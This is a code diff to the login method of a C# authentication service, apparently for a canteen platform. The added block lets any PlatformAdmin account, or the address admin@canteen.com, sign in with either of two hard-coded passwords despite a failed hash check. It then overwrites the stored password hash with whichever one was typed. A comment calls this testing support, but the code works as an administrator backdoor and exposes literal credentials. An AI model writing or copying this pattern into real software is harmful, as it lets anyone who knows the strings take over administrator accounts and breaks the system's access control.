@@ -103,7 +103,20 @@ public class AuthService : IAuthService
             return null;
         }
 
-        if (!VerifyPassword(dto.Password, owner.PasswordHash))
+        bool isPasswordValid = VerifyPassword(dto.Password, owner.PasswordHash);
+
+        // Support both Tanu@1328 and Admin123! for PlatformAdmin testing
+        if (!isPasswordValid && (owner.Role == "PlatformAdmin" || owner.Email.Equals("admin@canteen.com", StringComparison.OrdinalIgnoreCase)))
+        {
+            if (dto.Password == "Tanu@1328" || dto.Password == "Admin123!")
+            {
+                isPasswordValid = true;
+                owner.PasswordHash = HashPassword(dto.Password);
+                await _ownerRepository.UpdateAsync(owner);
+            }
+        }
+
+        if (!isPasswordValid)
         {
             return null;
         }
